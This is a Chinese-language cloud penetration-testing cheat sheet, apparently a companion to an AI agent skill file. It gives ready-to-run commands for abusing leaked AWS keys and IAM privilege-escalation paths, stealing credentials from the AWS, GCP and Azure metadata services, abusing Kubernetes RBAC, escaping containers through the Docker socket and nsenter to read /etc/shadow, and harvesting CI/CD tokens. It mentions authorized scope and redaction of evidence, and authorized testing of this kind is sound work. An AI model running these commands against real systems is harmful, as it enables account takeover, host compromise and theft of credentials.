# 云原生速查（命令 + 判据）

> 配套 `SKILL.md`。仅在授权账号/集群/订阅内操作。占位符：`<profile>`、`<region>`、`<cluster>`、`<ns>`、`<sa>`、`<image>`。

## 0. 环境与证据

```bash
mkdir -p work/<case>/{cloud,k8s,container,ci}
date -Is | tee work/<case>/run.start
aws --version; kubectl version --client; trivy --version
```

所有云调用先记录身份与区域，避免误打其他账号：

```bash
aws sts get-caller-identity --profile <profile> | tee work/<case>/cloud/whoami.json
aws configure get region --profile <profile>
```

## 1. AK-SK 泄露利用

### 1.1 身份与权限面

```bash
export AWS_PROFILE=<profile>
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>
aws iam get-user
# 角色路径
aws iam list-attached-role-policies --role-name <role>
aws iam list-role-policies --role-name <role>
```

只读资源快查（控制条数，避免审计噪音）：

```bash
aws s3 ls
aws ec2 describe-instances --max-items 5 --region <region>
aws lambda list-functions --max-items 10 --region <region>
aws secretsmanager list-secrets --max-items 10 --region <region>
```

### 1.2 常见提权面

| 权限 | 用法 |
|---|---|
| `iam:CreatePolicyVersion` | 建新策略版本挂管理员权限 |
| `iam:AttachUserPolicy` / `AttachRolePolicy` | 直接挂 AdministratorAccess |
| `iam:PassRole` + `lambda:CreateFunction` | 传高权角色给函数执行 |
| `iam:PassRole` + `ec2:RunInstances` | 起带高权实例角色的机器 |
| `sts:AssumeRole` | 横向到其他角色/账号 |
| `s3:GetObject` | 拿配置、备份、tfstate 中的下一跳凭据 |

判据：`sts get-caller-identity` 返回的 ARN 权限级别发生变化（低权用户 → 角色/管理员），或拿到可用的下一跳凭据。

### 1.3 只读优先

```bash
# 不要批量下载；先看元数据与大小
aws s3api head-object --bucket <bucket> --key <key>
aws s3api list-objects-v2 --bucket <bucket> --max-items 20
```

判据：能证明对象可读（head/list 成功）即可作为证据；批量导出需要额外授权。

## 2. 元数据 SSRF

### AWS（IMDSv2）

```bash
TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' \
  -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
```

### GCP

```bash
curl -s -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
curl -s -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes'
```

### Azure

```bash
curl -s -H Metadata:true \
  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
```

判据：拿到临时凭据（AK-SK-SessionToken / OAuth token）并成功调用身份接口：

```bash
AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... \
  aws sts get-caller-identity
```

只回显 200 或元数据目录不算；必须有可用凭据 + 权限输出。

## 3. K8s RBAC

```bash
kubectl config current-context
kubectl auth can-i --list
kubectl auth can-i --list --as=system:serviceaccount:<ns>:<sa>
kubectl get clusterrolebinding -o wide
kubectl get rolebinding -A -o wide
kubectl get secrets -A
```

- `create pods` / `create daemonsets` / `create jobs` → 可挂宿主路径或特权容器
- `get secrets` → 取 SA token、镜像仓库凭据
- `impersonate` / `bind` / `escalate` → 直接提权到高权角色
- `patch` / `update` 工作负载 → 改现有 Deployment 加挂载

判据：`kubectl auth can-i <verb> <resource>` 返回 `yes`，且能实际创建一个可验证的 Pod/Secret 读取结果。

## 4. 容器逃逸

```bash
id; capsh --print 2>/dev/null; cat /proc/1/cgroup; ls -l /var/run/docker.sock
mount | grep -E 'hostPath|/host|docker.sock|containerd.sock'
```

### 4.1 特权 / CAP_SYS_ADMIN

```bash
# 挂宿主根（只读优先）
mkdir -p /mnt/host && mount --bind / /mnt/host 2>/dev/null || \
  mount -t proc proc /mnt/host/proc
ls /mnt/host
# 或进入宿主命名空间
nsenter -t 1 -m -u -i -n -p -- id
```

### 4.2 Docker / containerd socket

```bash
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run --rm -it \
  -v /:/host --privileged alpine chroot /host sh
ctr -a /run/containerd/containerd.sock -n k8s.io containers list
```

### 4.3 hostPID / hostPath

```bash
nsenter -t 1 -m -u -i -n -p -- cat /etc/shadow
# hostPath 挂载点通常在 /var/lib/kubelet/pods/... 或自定义 /host
```

### 4.4 其他

- cgroup v1 `release_agent`（需 `CAP_SYS_ADMIN`）
- `CAP_SYS_PTRACE` + 注入宿主进程
- 内核漏洞（按内核版本匹配，勿在生产盲打）

判据：在宿主命名空间执行 `id` 返回宿主身份，或读到宿主 `/etc/shadow` / kubelet 凭据，并给出完整复现命令。

## 5. CI/CD 凭据

```bash
env | grep -Ei 'AWS|AZURE|GCP|TOKEN|SECRET|CI_|GITHUB|GITLAB|DOCKER'
ls -la ~/.aws ~/.docker ~/.config/gcloud 2>/dev/null
cat ~/.docker/config.json 2>/dev/null
git config --list --show-origin | grep -Ei 'url|token'
```

- `GITHUB_TOKEN` / `CI_JOB_TOKEN` 的 scope（能否写仓库、读环境变量）
- Runner 是否共享、能否被 MR/PR 触发
- 制品仓库凭据能否拉取/推送生产镜像
- 云 OIDC 信任策略是否过宽（`sub` 通配）

判据：用 CI token 成功读取受保护环境变量、推送镜像、或 AssumeRole 到部署角色，且有 API 返回。

## 6. 镜像与配置扫描

```bash
trivy image --severity HIGH,CRITICAL <image>
trivy config .
trivy fs --scanners secret .
# 替代
grype <image>; syft <image> -o json
```

判据：命中可利用的 HIGH/CRITICAL（有已知利用链）或明文密钥；仅版本旧不算提权证据。

## 7. 判据复核

1. 凭据可用且可复现（换机器重放仍成功）？
2. 权限提升有客观输出（STS ARN、`auth can-i`、宿主 `id`）？
3. 证据已归档并脱敏（AK/SK 只留指纹与过期时间）？

三条全满足才写"已打穿"；否则写"待验证"并说明缺哪一步。
